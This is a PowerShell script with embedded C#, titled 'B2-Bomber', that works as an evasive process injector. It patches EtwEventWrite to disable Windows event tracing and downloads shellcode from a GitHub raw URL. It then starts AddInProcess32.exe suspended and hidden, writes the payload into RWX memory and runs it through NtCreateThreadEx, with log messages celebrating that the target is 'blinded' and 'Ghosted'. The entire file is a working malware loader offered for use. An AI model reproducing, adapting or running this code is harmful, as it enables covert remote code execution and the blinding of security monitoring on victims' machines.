<#
.SYNOPSIS
    B2-Bomber: Evasive Process Injector (C# IL Engine)
.DESCRIPTION
    Patches ETW logging, downloads shellcode, spawns addinprocess32.exe (suspended), 
    allocates RWX memory, writes payload, and executes via NtCreateThreadEx.
#>

$TypeDef = @"
using System;
using System.Runtime.InteropServices;
using System.Net;

public class NtApi {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll")]
    public static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

    [DllImport("ntdll.dll")]
    public static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);

    [DllImport("ntdll.dll")]
    public static extern uint NtCreateThreadEx(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter, bool CreateSuspended, int StackZeroBits, int SizeOfStack, int MaximumStackSize, IntPtr AttributeList);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    public static bool PatchETW() {
        IntPtr lib = LoadLibrary("ntdll");
        IntPtr addr = GetProcAddress(lib, "EtwEventWrite");
        uint old;
        VirtualProtect(addr, (UIntPtr)1, 0x40, out old);
        Marshal.WriteByte(addr, 0xC3);
        return true;
    }

    public static bool SpawnAndInject(string url) {
        byte[] payload;
        using (var client = new WebClient()) {
            client.Headers.Add("User-Agent", "Mozilla/5.0");
            payload = client.DownloadData(url);
        }
        
        string targetPath = System.Environment.GetEnvironmentVariable("windir") + @"\Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe";
        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(si);
        si.dwFlags = 1;
        si.wShowWindow = 0;
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        
        // CREATE_SUSPENDED (0x4) | CREATE_NO_WINDOW (0x08000000)
        bool createResult = CreateProcess(null, targetPath, IntPtr.Zero, IntPtr.Zero, false, 0x4 | 0x8000000, IntPtr.Zero, null, ref si, out pi);
        if (!createResult) return false;
        
        IntPtr baseAddress = IntPtr.Zero;
        IntPtr size = (IntPtr)payload.Length;
        uint status = NtAllocateVirtualMemory(pi.hProcess, ref baseAddress, IntPtr.Zero, ref size, 0x3000, 0x40);
        if (status != 0) return false;
        
        uint bytesWritten;
        status = NtWriteVirtualMemory(pi.hProcess, baseAddress, payload, (uint)payload.Length, out bytesWritten);
        if (status != 0) return false;
        
        IntPtr threadHandle;
        status = NtCreateThreadEx(out threadHandle, 0x1FFFFF, IntPtr.Zero, pi.hProcess, baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
        if (status != 0) return false;
        
        return true;
    }
}
"@

Add-Type -TypeDefinition $TypeDef -Language CSharp

function Write-TimeStampedLog {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff"
    Write-Host "[$timestamp] $Message" -ForegroundColor Cyan
}

# --- EXECUTION FLOW ---

Write-TimeStampedLog "[*] B2-Bomber Starting..."
Write-TimeStampedLog "[*] Patching ETW logging (EtwEventWrite -> RET)..."

try {
    $etwPatched = [NtApi]::PatchETW()
    if ($etwPatched) {
        Write-TimeStampedLog "[+] ETW successfully blinded."
    } else {
        Write-TimeStampedLog "[-] ETW patch failed."
        exit
    }
} catch {
    Write-TimeStampedLog "[-] ETW patch exception: $_"
    exit
}

Write-TimeStampedLog "[*] Retrieving shellcode and spawning hidden host process (addinprocess32.exe)..."
# Replace with your actual payload URL
$shellcodeUrl = "https://github.com/i25968627-ui/crispy-spoon/raw/refs/heads/main/nfasiv.bin" 

try {
    $success = [NtApi]::SpawnAndInject($shellcodeUrl)
    
    if ($success) {
        Write-TimeStampedLog "[+] Injection Successful! Process kept alive (suspended)."
        Write-TimeStampedLog "[*] Erasing local memory footprint..."
        [GC]::Collect()
        [GC]::WaitForPendingFinalizers()
        Write-TimeStampedLog "[+] Cleanup complete. Ghosted."
        
        Write-Host "████████████████████████████████████" -ForegroundColor Green
        Write-Host "█  INJECTION SUCCESSFUL!          █" -ForegroundColor Green 
        Write-Host "█  Process kept alive (suspended) █" -ForegroundColor Green
        Write-Host "█  Shellcode thread running       █" -ForegroundColor Green
        Write-Host "████████████████████████████████████" -ForegroundColor Green
    } else {
        Write-TimeStampedLog "[-] Injection failed. Check payload URL and architecture."
    }
} catch {
    Write-TimeStampedLog "[-] Execution exception: $_"
}